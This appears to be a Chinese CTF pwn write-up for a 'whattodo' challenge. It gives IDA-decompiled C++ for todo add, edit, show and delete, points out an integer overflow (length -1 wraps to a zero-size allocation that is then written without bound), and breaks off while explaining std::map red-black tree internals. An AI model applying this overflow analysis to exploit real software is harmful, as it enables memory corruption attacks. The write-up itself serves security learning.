whattodo
========

试了下fuzz，没出来

只能逆了

逆向
==

```c
unsigned __int64 __fastcall todo_add(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        __int64 a21)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  *(_QWORD *)&title_string_object.str[8] = __readfsqword(0x28u);
  LOBYTE(title_string_object.ptr) = 0;
  title = &title_string_object;
  max_len = 0LL;
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Title: ", 7LL);
  std::operator>><char>(std::cin, &title);
  find_node_ptr = (struct node *)std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::find(
                                   (__int64)&map_stuct,
                                   (__int64)&title);
  if ( find_node_ptr != (struct node *)&map_stuct.color )// std::cout << "Already exists" << std::endl;
  {
    std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Already exists", 14LL);
    v22 = *(_QWORD *)(std::cout[0] - 24LL);
    v23 = *(_BYTE **)((char *)&std::cout[30] + v22);
    if ( !v23 )
      std::__throw_bad_cast();
    if ( v23[56] )
    {
      v24 = v23[67];
    }
    else
    {
      std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cout[30] + v22));
      v24 = 10;
      v27 = *(__int64 (__fastcall **)())(*(_QWORD *)v23 + 48LL);
      if ( v27 != std::ctype<char>::do_widen )
        v24 = ((__int64 (__fastcall *)(_BYTE *, __int64))v27)(v23, 10LL);
    }
    v25 = (std::ostream *)std::ostream::put((std::ostream *)std::cout, v24);
    std::ostream::flush(v25);
    goto LABEL_6;
  }
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Length: ", 8LL);
  std::istream::_M_extract<unsigned int>(std::cin, &len);
  len_more1 = (unsigned int)(len + 1);
  todo_node_chunk = (void *)operator new[](len_more1);
  if ( len_more1 )
    memset(todo_node_chunk, 0, len_more1);
  find_node_ptr_1 = find_node_ptr;
  len_3 = len;
  if ( !map_stuct.parents )
    goto LABEL_34;
  find_node_ptr_2 = find_node_ptr;
  root_ = (struct node *)map_stuct.parents;
  title_2 = title;
  max_len_1 = max_len;
  title_1 = title;
  current_node = (struct node *)map_stuct.parents;
  do
  {
    while ( 1 )
    {
      current_node_title_len = current_node->title_str_obj.size;
      len_1 = max_len_1;
      if ( current_node_title_len <= max_len_1 )
        len_1 = current_node->title_str_obj.size;
      if ( len_1 )
      {
        cmp_result = memcmp((const void *)current_node->title_str_obj.ptr, title_1, len_1);
        if ( cmp_result )
          break;
      }
      difference = current_node_title_len - max_len_1;
      if ( difference >= 0x80000000LL )
        goto LABEL_24;
      if ( difference > (__int64)0xFFFFFFFF7FFFFFFFLL )
      {
        cmp_result = difference;
        break;
      }
LABEL_15:
      current_node = (struct node *)current_node->right_son_node;
      if ( !current_node )
        goto LABEL_25;
    }
    if ( cmp_result < 0 )
      goto LABEL_15;
LABEL_24:
    find_node_ptr_1 = current_node;
    current_node = (struct node *)current_node->left_son_node;
  }
  while ( current_node );
LABEL_25:
  max_len_2 = max_len_1;
  find_node_ptr = find_node_ptr_2;
  root = root_;
  if ( find_node_ptr_1 == (struct node *)&map_stuct.color )
    goto LABEL_34;
  len_4 = find_node_ptr_1->title_str_obj.size;
  len_2 = max_len_2;
  if ( len_4 <= max_len_2 )
    len_2 = find_node_ptr_1->title_str_obj.size;
  if ( len_2 )
  {
    LODWORD(v41) = memcmp(title_2, (const void *)find_node_ptr_1->title_str_obj.ptr, len_2);
    if ( (_DWORD)v41 )
    {
LABEL_32:
      if ( (int)v41 < 0 )
        goto LABEL_34;
      goto LABEL_33;
    }
  }
  v41 = max_len_2 - len_4;
  if ( (__int64)(max_len_2 - len_4) > 0x7FFFFFFF )
  {
LABEL_33:
    find_node_ptr_1->todo_pair.todo_ptr = todo_node_chunk;
    LODWORD(find_node_ptr_1->todo_pair.todo_len) = len_3;
    goto LABEL_36;
  }
  if ( v41 >= (__int64)0xFFFFFFFF80000000LL )
    goto LABEL_32;
LABEL_34:
  p_title = &title;
  new_node = std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_emplace_hint_unique<std::piecewise_construct_t const&,std::tuple<std::string const&>,std::tuple<>>(
               &map_stuct,
               find_node_ptr_1,
               (char ***)&p_title);
  root = (struct node *)map_stuct.parents;
  new_node->todo_pair.todo_ptr = todo_node_chunk;
  LODWORD(new_node->todo_pair.todo_len) = len_3;
  if ( !root )
    goto insert;
  max_len_2 = max_len;
  title_2 = title;
LABEL_36:
  max_len_3 = max_len_2;
  v44 = find_node_ptr;
  current = root;
  max_len_4 = max_len_3;
  while ( 2 )
  {
    while ( 2 )
    {
      current_len = current->title_str_obj.size;
      len_5 = max_len_4;
      if ( current_len <= max_len_4 )
        len_5 = current->title_str_obj.size;
      if ( !len_5 || (comp_result = memcmp((const void *)current->title_str_obj.ptr, title_2, len_5)) == 0 )
      {
        differ = current_len - max_len_4;
        if ( differ >= 0x80000000LL )
          goto LABEL_46;
        if ( differ > (__int64)0xFFFFFFFF7FFFFFFFLL )
        {
          comp_result = differ;
          break;
        }
LABEL_37:
        current = (struct node *)current->right_son_node;
        if ( !current )
          goto access;
        continue;
      }
      break;
    }
    if ( comp_result < 0 )
      goto LABEL_37;
LABEL_46:
    v44 = current;
    current = (struct node *)current->left_son_node;
    if ( current )
      continue;
    break;
  }
access:
  v51 = max_len_4;
  find_node_ptr = v44;
  v52 = v51;
  if ( find_node_ptr == (struct node *)&map_stuct.color )
    goto insert;
  size = find_node_ptr->title_str_obj.size;
  v54 = v51;
  if ( size <= v51 )
    v54 = find_node_ptr->title_str_obj.size;
  if ( v54 && (LODWORD(v55) = memcmp(title_2, (const void *)find_node_ptr->title_str_obj.ptr, v54), (_DWORD)v55) )
  {
LABEL_54:
    if ( (int)v55 < 0 )
      goto insert;
  }
  else
  {
    v55 = v52 - size;
    if ( (__int64)(v52 - size) <= 0x7FFFFFFF )
    {
      if ( v55 >= (__int64)0xFFFFFFFF80000000LL )
        goto LABEL_54;
insert:
      title_addr = &title;
      find_node_ptr = std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_emplace_hint_unique<std::piecewise_construct_t const&,std::tuple<std::string const&>,std::tuple<>>(
                        &map_stuct,
                        find_node_ptr,
                        (char ***)&title_addr);
    }
  }
  if ( !find_node_ptr->todo_pair.todo_ptr )
  {
    std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Out of memory", 13LL);
    v56 = *(_QWORD *)(std::cout[0] - 24LL);
    v57 = *(_BYTE **)((char *)&std::cout[30] + v56);
    if ( v57 )
    {
      if ( v57[56] )
      {
        v58 = (unsigned int)(char)v57[67];
      }
      else
      {
        std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cout[30] + v56));
        v58 = 10LL;
        v64 = *(__int64 (__fastcall **)())(*(_QWORD *)v57 + 48LL);
        if ( v64 != std::ctype<char>::do_widen )
          v58 = (unsigned int)((char (__fastcall *)(_BYTE *, __int64))v64)(v57, 10LL);
      }
      v59 = (std::ostream *)std::ostream::put((std::ostream *)std::cout, v58);
      std::ostream::flush(v59);
      todo_add(
        (__int64)v59,
        v58,
        v60,
        v61,
        v62,
        v63,
        a7,
        a8,
        a9,
        a10,
        a11,
        a12,
        a13,
        a14,
        a15,
        a16,
        a17,
        a18,
        a19,
        a20,
        a21);
    }
    std::__throw_bad_cast();
  }
LABEL_6:
  if ( title != &title_string_object )
    operator delete(title);
  return *(_QWORD *)&title_string_object.str[8] - __readfsqword(0x28u);
}

unsigned __int64 todo_edit(void)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  *(_QWORD *)&str_obj.str[8] = __readfsqword(0x28u);
  LOBYTE(str_obj.ptr) = 0;
  title_str_obj_ptr = &str_obj;
  len_1 = 0LL;
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Title: ", 7LL);
  std::operator>><char>(std::cin, &title_str_obj_ptr);
  if ( &map_stuct.color == (_QWORD *)std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::find(
                                       (struct node *)&map_stuct,
                                       (struct node *)&title_str_obj_ptr) )
  {
    std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Not found", 9LL);
    v25 = *(_QWORD *)(std::cout[0] - 24LL);
    v26 = *(_BYTE **)((char *)&std::cout[30] + v25);
    if ( !v26 )
      std::__throw_bad_cast();
    if ( v26[56] )
    {
      v27 = v26[67];
    }
    else
    {
      std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cout[30] + v25));
      v27 = 10;
      v29 = *(__int64 (__fastcall **)())(*(_QWORD *)v26 + 48LL);
      if ( v29 != std::ctype<char>::do_widen )
        v27 = ((__int64 (__fastcall *)(_BYTE *, __int64))v29)(v26, 10LL);
    }
    v28 = (std::ostream *)std::ostream::put((std::ostream *)std::cout, v27);
    std::ostream::flush(v28);
    goto finish;
  }
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "TODO: ", 6LL);
  curent = (struct node *)map_stuct.parents;
  if ( !map_stuct.parents )
  {
    end_iterator_adddr = (struct node *)&map_stuct.color;
    goto insert;
  }
  title_1 = title_str_obj_ptr;
  root__node = (struct node *)map_stuct.parents;
  len_2 = len_1;
  end_iterator_adddr_1 = (struct node *)&map_stuct.color;
  do
  {
    while ( 1 )
    {
      current_len = curent->title_str_obj.size;
      len = len_2;
      if ( current_len <= len_2 )
        len = curent->title_str_obj.size;
      if ( len )
      {
        cmp_result = memcmp((const void *)curent->title_str_obj.ptr, title_1, len);
        if ( cmp_result )
          break;
      }
      differ = current_len - len_2;
      if ( differ >= 0x80000000LL )
        goto LABEL_13;
      if ( differ > (__int64)0xFFFFFFFF7FFFFFFFLL )
      {
        cmp_result = differ;
        break;
      }
LABEL_4:
      curent = (struct node *)curent->right_son_node;
      if ( !curent )
        goto LABEL_14;
    }
    if ( cmp_result < 0 )
      goto LABEL_4;
LABEL_13:
    end_iterator_adddr_1 = curent;
    curent = (struct node *)curent->left_son_node;
  }
  while ( curent );
LABEL_14:
  end_iterator_adddr = end_iterator_adddr_1;
  root__node_1 = root__node;
  if ( end_iterator_adddr_1 == (struct node *)&map_stuct.color )
    goto insert;
  end_iterator_adddr_1_len = end_iterator_adddr_1->title_str_obj.size;
  len_3 = len_2;
  if ( end_iterator_adddr_1_len <= len_2 )
    len_3 = end_iterator_adddr_1->title_str_obj.size;
  if ( len_3 )
  {
    LODWORD(comp_result) = memcmp(title_1, (const void *)end_iterator_adddr_1->title_str_obj.ptr, len_3);
    end_iterator_adddr = end_iterator_adddr_1;
    if ( (_DWORD)comp_result )
    {
LABEL_21:
      if ( (int)comp_result < 0 )
        goto insert;
      goto LABEL_22;
    }
  }
  comp_result = len_2 - end_iterator_adddr_1_len;
  if ( (__int64)(len_2 - end_iterator_adddr_1_len) > 0x7FFFFFFF )
  {
LABEL_22:
    *(__int64 *)((char *)&std::cin[2] + *(_QWORD *)(std::cin[0] - 24)) = SLODWORD(end_iterator_adddr->todo_pair.todo_len);
    goto LABEL_23;
  }
  if ( comp_result >= (__int64)0xFFFFFFFF80000000LL )
    goto LABEL_21;
insert:
  p_title_str_obj_ptr = &title_str_obj_ptr;
  v24 = std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_emplace_hint_unique<std::piecewise_construct_t const&,std::tuple<std::string const&>,std::tuple<>>(
          &map_stuct,
          end_iterator_adddr,
          (char ***)&p_title_str_obj_ptr);
  root__node_1 = (struct node *)map_stuct.parents;
  *(__int64 *)((char *)&std::cin[2] + *(_QWORD *)(std::cin[0] - 24)) = SLODWORD(v24->todo_pair.todo_len);
  if ( !root__node_1 )
  {
    end_iterator_adddr_2 = (struct node *)&map_stuct.color;
    goto LABEL_42;
  }
  title_1 = title_str_obj_ptr;
  len_2 = len_1;
LABEL_23:
  end_iterator_adddr_2 = (struct node *)&map_stuct.color;
  len_4 = len_2;
  curent_node = root__node_1;
  while ( 2 )
  {
    while ( 2 )
    {
      len_5 = curent_node->title_str_obj.size;
      len_6 = len_4;
      if ( len_5 <= len_4 )
        len_6 = curent_node->title_str_obj.size;
      if ( !len_6 || (differ_2 = memcmp((const void *)curent_node->title_str_obj.ptr, title_1, len_6)) == 0 )
      {
        differ_1 = len_5 - len_4;
        if ( differ_1 >= 0x80000000LL )
          goto LABEL_33;
        if ( differ_1 > (__int64)0xFFFFFFFF7FFFFFFFLL )
        {
          differ_2 = differ_1;
          break;
        }
LABEL_24:
        curent_node = (struct node *)curent_node->right_son_node;
        if ( !curent_node )
          goto LABEL_34;
        continue;
      }
      break;
    }
    if ( differ_2 < 0 )
      goto LABEL_24;
LABEL_33:
    end_iterator_adddr_2 = curent_node;
    curent_node = (struct node *)curent_node->left_son_node;
    if ( curent_node )
      continue;
    break;
  }
LABEL_34:
  if ( end_iterator_adddr_2 == (struct node *)&map_stuct.color )
    goto LABEL_42;
  end_iterator_adddr_2_len = end_iterator_adddr_2->title_str_obj.size;
  end_iterator_adddr_2_len_1 = len_4;
  if ( end_iterator_adddr_2_len <= len_4 )
    end_iterator_adddr_2_len_1 = end_iterator_adddr_2->title_str_obj.size;
  if ( end_iterator_adddr_2_len_1
    && (LODWORD(comp_result_1) = memcmp(
                                   title_1,
                                   (const void *)end_iterator_adddr_2->title_str_obj.ptr,
                                   end_iterator_adddr_2_len_1),
        (_DWORD)comp_result_1) )
  {
LABEL_41:
    if ( (int)comp_result_1 < 0 )
      goto LABEL_42;
  }
  else
  {
    comp_result_1 = len_4 - end_iterator_adddr_2_len;
    if ( (__int64)(len_4 - end_iterator_adddr_2_len) <= 0x7FFFFFFF )
    {
      if ( comp_result_1 >= (__int64)0xFFFFFFFF80000000LL )
        goto LABEL_41;
LABEL_42:
      v32 = &title_str_obj_ptr;
      end_iterator_adddr_2 = std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_emplace_hint_unique<std::piecewise_construct_t const&,std::tuple<std::string const&>,std::tuple<>>(
                               &map_stuct,
                               end_iterator_adddr_2,
                               (char ***)&v32);
    }
  }
  std::__istream_extract(std::cin, end_iterator_adddr_2->todo_pair.todo_ptr, 0x7FFFFFFFFFFFFFFFLL);
finish:
  if ( title_str_obj_ptr != &str_obj )
    operator delete(title_str_obj_ptr);
  return *(_QWORD *)&str_obj.str[8] - __readfsqword(0x28u);
}

unsigned __int64 todo_show(void)
{
  struct node *curent_node; // r15
  struct string *title_str_obj_ptr_1; // r12
  unsigned __int64 len_1; // r14
  struct node *end_iterator_adddr; // rbx
  unsigned __int64 len_2; // rbp
  size_t len_3; // rdx
  int comp_result; // eax
  unsigned __int64 len_4; // r13
  size_t len_5; // rdx
  int comp_result_1; // eax
  const char *todo_ptr; // rbx
  size_t todo_len; // rax
  _BYTE *v12; // rbx
  char v13; // si
  std::ostream *v14; // rax
  __int64 (__fastcall *v16)(); // rax
  struct string **p_title_str_obj_ptr; // [rsp+18h] [rbp-70h] BYREF
  struct string *title_str_obj_ptr; // [rsp+20h] [rbp-68h] BYREF
  unsigned __int64 len; // [rsp+28h] [rbp-60h]
  struct string str_obj; // [rsp+30h] [rbp-58h] BYREF

  *(_QWORD *)&str_obj.str[8] = __readfsqword(0x28u);
  LOBYTE(str_obj.ptr) = 0;
  title_str_obj_ptr = &str_obj;
  len = 0LL;
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Title: ", 7LL);
  std::operator>><char>(std::cin, &title_str_obj_ptr);
  if ( &map_stuct.color == (_QWORD *)std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::find(
                                       (struct node *)&map_stuct,
                                       (struct node *)&title_str_obj_ptr) )
  {
    std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Not found", 9LL);
    v12 = *(_BYTE **)((char *)&std::cout[30] + *(_QWORD *)(std::cout[0] - 24LL));
    if ( !v12 )
      std::__throw_bad_cast();
    goto LABEL_27;
  }
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "TODO: ", 6LL);
  curent_node = (struct node *)map_stuct.parents;
  if ( !map_stuct.parents )
  {
    end_iterator_adddr = (struct node *)&map_stuct.color;
    goto LABEL_23;
  }
  title_str_obj_ptr_1 = title_str_obj_ptr;
  len_1 = len;
  end_iterator_adddr = (struct node *)&map_stuct.color;
  do
  {
    while ( 1 )
    {
      len_2 = curent_node->title_str_obj.size;
      len_3 = len_1;
      if ( len_2 <= len_1 )
        len_3 = curent_node->title_str_obj.size;
      if ( len_3 )
      {
        comp_result = memcmp((const void *)curent_node->title_str_obj.ptr, title_str_obj_ptr_1, len_3);
        if ( comp_result )
          break;
      }
      if ( (__int64)(len_2 - len_1) >= 0x80000000LL )
        goto LABEL_13;
      if ( (__int64)(len_2 - len_1) > (__int64)0xFFFFFFFF7FFFFFFFLL )
      {
        comp_result = len_2 - len_1;
        break;
      }
LABEL_4:
      curent_node = (struct node *)curent_node->right_son_node;
      if ( !curent_node )
        goto LABEL_14;
    }
    if ( comp_result < 0 )
      goto LABEL_4;
LABEL_13:
    end_iterator_adddr = curent_node;
    curent_node = (struct node *)curent_node->left_son_node;
  }
  while ( curent_node );
LABEL_14:
  if ( end_iterator_adddr == (struct node *)&map_stuct.color )
    goto LABEL_23;
  len_4 = end_iterator_adddr->title_str_obj.size;
  len_5 = len_1;
  if ( len_4 <= len_1 )
    len_5 = end_iterator_adddr->title_str_obj.size;
  if ( len_5
    && (comp_result_1 = memcmp(title_str_obj_ptr_1, (const void *)end_iterator_adddr->title_str_obj.ptr, len_5)) != 0 )
  {
LABEL_22:
    if ( comp_result_1 < 0 )
      goto LABEL_23;
  }
  else if ( (__int64)(len_1 - len_4) <= 0x7FFFFFFF )
  {
    if ( (__int64)(len_1 - len_4) >= (__int64)0xFFFFFFFF80000000LL )
    {
      comp_result_1 = len_1 - len_4;
      goto LABEL_22;
    }
LABEL_23:
    p_title_str_obj_ptr = &title_str_obj_ptr;
    end_iterator_adddr = std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_emplace_hint_unique<std::piecewise_construct_t const&,std::tuple<std::string const&>,std::tuple<>>(
                           &map_stuct,
                           end_iterator_adddr,
                           (char ***)&p_title_str_obj_ptr);
  }
  todo_ptr = (const char *)end_iterator_adddr->todo_pair.todo_ptr;
  if ( todo_ptr )
  {
    todo_len = strlen(todo_ptr);
    std::__ostream_insert<char,std::char_traits<char>>(std::cout, todo_ptr, todo_len);
  }
  else
  {
    std::ios::clear(
      (char *)std::cout + *(_QWORD *)(std::cout[0] - 24LL),
      *(_DWORD *)((char *)&std::cout[4] + *(_QWORD *)(std::cout[0] - 24LL)) | 1u);
  }
  v12 = *(_BYTE **)((char *)&std::cout[30] + *(_QWORD *)(std::cout[0] - 24LL));
  if ( !v12 )
    std::__throw_bad_cast();
LABEL_27:
  if ( v12[56] )
  {
    v13 = v12[67];
  }
  else
  {
    std::ctype<char>::_M_widen_init(v12);
    v13 = 10;
    v16 = *(__int64 (__fastcall **)())(*(_QWORD *)v12 + 48LL);
    if ( v16 != std::ctype<char>::do_widen )
      v13 = ((__int64 (__fastcall *)(_BYTE *, __int64))v16)(v12, 10LL);
  }
  v14 = (std::ostream *)std::ostream::put((std::ostream *)std::cout, v13);
  std::ostream::flush(v14);
  if ( title_str_obj_ptr != &str_obj )
    operator delete(title_str_obj_ptr);
  return *(_QWORD *)&str_obj.str[8] - __readfsqword(0x28u);
}

unsigned __int64 todo_delete(void)
{
  void *v0; // r13
  void *v1; // r12
  unsigned __int64 v2; // r15
  int *v3; // rbp
  unsigned __int64 v4; // r14
  size_t v5; // rdx
  int v6; // eax
  unsigned __int64 v7; // r14
  size_t v8; // rdx
  int v9; // eax
  void *v10; // rdi
  __int64 v11; // rax
  int *v12; // rdx
  int *v13; // r13
  __int64 v14; // r12
  __int64 v15; // rdi
  __int64 v16; // rax
  void *v17; // rdi
  void *v18; // rbp
  __int64 v20; // rax
  _BYTE *v21; // rbx
  char v22; // si
  std::ostream *v23; // rax
  __int64 (__fastcall *v24)(); // rax
  void **p_s2; // [rsp+18h] [rbp-70h] BYREF
  void *titile; // [rsp+20h] [rbp-68h] BYREF
  unsigned __int64 v27; // [rsp+28h] [rbp-60h]
  __int64 v28[3]; // [rsp+30h] [rbp-58h] BYREF
  unsigned __int64 v29; // [rsp+48h] [rbp-40h]

  v29 = __readfsqword(0x28u);
  LOBYTE(v28[0]) = 0;
  titile = v28;
  v27 = 0LL;
  std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Title: ", 7LL);
  std::operator>><char>(std::cin, &titile);
  if ( &MEMORY[0x72C8] == (int *)std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::find(
                                   (__int64)&map_stuct,
                                   (__int64)&titile) )
  {
    std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Not found", 9LL);
    v20 = *(_QWORD *)(std::cout[0] - 24);
    v21 = *(_BYTE **)((char *)&std::cout[30] + v20);
    if ( !v21 )
      std::__throw_bad_cast();
    if ( v21[56] )
    {
      v22 = v21[67];
    }
    else
    {
      std::ctype<char>::_M_widen_init(*(__int64 *)((char *)&std::cout[30] + v20));
      v22 = 10;
      v24 = *(__int64 (__fastcall **)())(*(_QWORD *)v21 + 48LL);
      if ( v24 != std::ctype<char>::do_widen )
        v22 = ((__int64 (__fastcall *)(_BYTE *, __int64))v24)(v21, 10LL);
    }
    v23 = (std::ostream *)std::ostream::put((std::ostream *)std::cout, v22);
    std::ostream::flush(v23);
    goto LABEL_32;
  }
  v0 = MEMORY[0x72D0];
  if ( !MEMORY[0x72D0] )
  {
    v3 = &MEMORY[0x72C8];
    goto LABEL_23;
  }
  v1 = titile;
  v2 = v27;
  v3 = &MEMORY[0x72C8];
  do
  {
    while ( 1 )
    {
      v4 = *((_QWORD *)v0 + 5);
      v5 = v2;
      if ( v4 <= v2 )
        v5 = *((_QWORD *)v0 + 5);
      if ( v5 )
      {
        v6 = memcmp(*((const void **)v0 + 4), v1, v5);
        if ( v6 )
          break;
      }
      if ( (__int64)(v4 - v2) >= 0x80000000LL )
        goto LABEL_13;
      if ( (__int64)(v4 - v2) > (__int64)0xFFFFFFFF7FFFFFFFLL )
      {
        v6 = v4 - v2;
        break;
      }
LABEL_4:
      v0 = (void *)*((_QWORD *)v0 + 3);
      if ( !v0 )
        goto LABEL_14;
    }
    if ( v6 < 0 )
      goto LABEL_4;
LABEL_13:
    v3 = (int *)v0;
    v0 = (void *)*((_QWORD *)v0 + 2);
  }
  while ( v0 );
LABEL_14:
  if ( v3 == &MEMORY[0x72C8] )
    goto LABEL_23;
  v7 = *((_QWORD *)v3 + 5);
  v8 = v2;
  if ( v7 <= v2 )
    v8 = *((_QWORD *)v3 + 5);
  if ( v8 && (v9 = memcmp(v1, *((const void **)v3 + 4), v8)) != 0 )
  {
LABEL_22:
    if ( v9 < 0 )
      goto LABEL_23;
  }
  else if ( (__int64)(v2 - v7) <= 0x7FFFFFFF )
  {
    if ( (__int64)(v2 - v7) >= (__int64)0xFFFFFFFF80000000LL )
    {
      v9 = v2 - v7;
      goto LABEL_22;
    }
LABEL_23:
    p_s2 = &titile;
    v3 = (int *)std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_emplace_hint_unique<std::piecewise_construct_t const&,std::tuple<std::string const&>,std::tuple<>>(
                  &map_stuct,
                  v3,
                  &p_s2);
  }
  v10 = (void *)*((_QWORD *)v3 + 8);
  if ( v10 )
    operator delete(v10, 1uLL);
  v11 = std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::equal_range(
          &map_stuct,
          &titile);
  v13 = v12;
  v14 = v11;
  if ( MEMORY[0x72D8] == v11 && &MEMORY[0x72C8] == v12 )
  {
    std::_Rb_tree<std::string,std::pair<std::string const,std::pair<char *,int>>,std::_Select1st<std::pair<std::string const,std::pair<char *,int>>>,std::less<std::string>,std::allocator<std::pair<std::string const,std::pair<char *,int>>>>::_M_erase(MEMORY[0x72D0]);
    MEMORY[0x72D8] = (__int64)&MEMORY[0x72C8];
    MEMORY[0x72D0] = 0LL;
    MEMORY[0x72E0] = (__int64)&MEMORY[0x72C8];
    MEMORY[0x72E8] = 0LL;
  }
  else if ( v12 != (int *)v11 )
  {
    do
    {
      v15 = v14;
      v14 = std::_Rb_tree_increment(v14);
      v16 = std::_Rb_tree_rebalance_for_erase(v15, &MEMORY[0x72C8]);
      v17 = *(void **)(v16 + 32);
      v18 = (void *)v16;
      if ( v17 != (void *)(v16 + 48) )
        operator delete(v17, *(_QWORD *)(v16 + 48) + 1LL);
      operator delete(v18, 0x50uLL);
      --MEMORY[0x72E8];
    }
    while ( v13 != (int *)v14 );
  }
LABEL_32:
  if ( titile != v28 )
    operator delete(titile, v28[0] + 1);
  return v29 - __readfsqword(0x28u);
}
```

这里存在整数溢出，输入-1，然后可以溢出0xffffffff，但size只有0x20

```c
 std::__ostream_insert<char,std::char_traits<char>>(std::cout, "Length: ", 8LL);
  std::istream::_M_extract<unsigned int>(std::cin, &len);
  len_more1 = (unsigned int)(len + 1);
  todo_node_chunk = (void *)operator new[](len_more1);
  if ( len_more1 )
    memset(todo_node_chunk, 0, len_more1);
```

edit发现输入无限制?难道可以溢出？发现不行好像自动束缚了

```c
std::__istream_extract(std::cin, *((_QWORD *)addr_node + 8), 0x7FFFFFFFFFFFFFFFLL);
```

map
===

但难点是map的逆向

[map的内存布局](https://blog.csdn.net/liuyuan185442111/article/details/135431267)  
[std::map原理](https://blog.csdn.net/wangbuji/article/details/123347299)  
[C++(STL):31 ---关联式容器map源码剖析](https://cloud.tencent.com/developer/article/1784465)

map是C++ STL中的关联容器，存储的是键值对（key-value)，可以通过key快速索引到value。map容器中的数据是自动排序的，其排序方式是严格的弱排序（stick weak ordering），即在判断Key1和Key2的大小时，使用“&lt;”而不是“&lt;=”。map 使用二叉搜索树实现，STL map的底层实现是红黑树。

map有几个值得注意的地方：map的赋值运算是深拷贝，即调用map\_a = map\_b后，map\_a中的元素拥有独立的内存空间。map的\[\]运算比较有意思，当元素不存在的时候会插入新的元素；在map中查找key是否存在时可以用find或count方法，find查找成功返回的是迭代器，查找失败则返回mymap.end()，说明该key不存在；map中的key不允许重复，其count方法只能返回0或1。

map定义
-----

map的所有元素都是pair，同时具备key和value，其中pair的第一个元素作为key，第二个元素作为value。map不允许相同key出现，并且所有pair根据key来自动排序，其中pair的定义在如下：

template &lt;typename T1, typename T2&gt;  
struct pair {  
typedef T1 first\_type;  
typedef T2 second\_type;

```php
T1 first;
T2 second;

pair() : first(T1()), second(T2()) { }
pair(const T1& a, const T2& b) : first(a), second(b) { }
```

};

从定义中看到pair使用模板化的struct来实现的，成员变量默认都是public类型。map的key不能被修改，但是value可以被修改，STL中的map是基于红黑树来实现的，因此可以认为map是基于红黑树封装了一层map的接口，底层的操作都是借助于RB-Tree的特性来实现的。

template &lt;class Key, class T, class Compare = less&lt;Key&gt;, class Alloc = alloc&gt;  
class map {  
public:  
typedef Key key\_type; //key类型  
typedef T data\_type; //value类型  
typedef T mapped\_type;  
typedef pair&lt;const Key, T&gt; value\_type; //元素类型, const要保证key不被修改  
typedef Compare key\_compare; //用于key比较的函数  
private:  
//内部采用RBTree作为底层容器  
typedef rb\_tree&lt;key\_type, value\_type,  
identity&lt;value\_type&gt;, key\_compare, Alloc&gt; rep\_type;  
rep\_type t; //t为内部RBTree容器  
public:  
//iterator\_traits相关  
typedef typename rep\_type::const\_pointer pointer;  
typedef typename rep\_type::const\_pointer const\_pointer;  
typedef typename rep\_type::const\_reference reference;  
typedef typename rep\_type::const\_reference const\_reference;  
typedef typename rep\_type::difference\_type difference\_type;

//迭代器相关  
typedef typename rep\_type::iterator iterator;  
typedef typename rep\_type::const\_iterator const\_iterator;  
typedef typename rep\_type::const\_reverse\_iterator reverse\_iterator;  
typedef typename rep\_type::const\_reverse\_iterator const\_reverse\_iterator;  
typedef typename rep\_type::size\_type size\_type;

//迭代器函数  
iterator begin() { return t.begin(); }  
